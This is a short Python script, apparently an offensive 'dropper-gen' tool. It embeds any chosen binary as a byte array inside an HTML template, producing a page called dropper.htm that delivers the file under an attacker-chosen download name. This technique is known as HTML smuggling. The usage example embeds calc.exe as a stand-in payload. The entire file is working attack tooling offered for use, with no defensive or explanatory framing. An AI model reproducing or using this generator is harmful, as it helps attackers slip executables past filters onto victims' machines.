import sys
template = "template.htm"
data_location = 65
file_name_location = 373
if (len(sys.argv) != 3):
    print("Usage: dropper-gen.py <file to embed> <file name for download>")
    print("Example:  python main.py C:\Windows\System32\calc.exe calc.exe")
    exit()

with open(sys.argv[1], "rb") as infile:
    file_data = ""
    byte = infile.read(1)
    while byte != b'':
        file_data += str(int.from_bytes(byte, "little")) + ","
        byte = infile.read(1)

    with open(template, "r") as tempfile:
        with open("dropper.htm", "w") as outfile:
            outfile.writelines(tempfile.readlines())
        with open("dropper.htm", "r+") as outfile:
            dropper = outfile.readlines()
            for index, line in enumerate(dropper):
                if "baiits = []" in line:
                    dropper.insert(index + 1, "baiits = [" + file_data + "];\n")
                elif "fileNameToSaveAs = \"\"" in line:
                    dropper.insert(index + 1, "fileNameToSaveAs = \"" + sys.argv[2] + "\";\n")
            outfile.seek(0)
            outfile.writelines(dropper)
